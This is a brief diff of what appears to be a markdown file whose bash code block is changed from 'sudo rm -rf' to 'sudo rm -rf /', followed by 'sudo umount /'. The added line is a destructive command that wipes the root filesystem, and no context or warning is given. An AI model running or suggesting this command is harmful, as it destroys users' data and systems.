@@ -3,6 +3,6 @@
 Hello
 
 ``` bash
-sudo rm -rf
+sudo rm -rf /
 sudo umount /
 ```
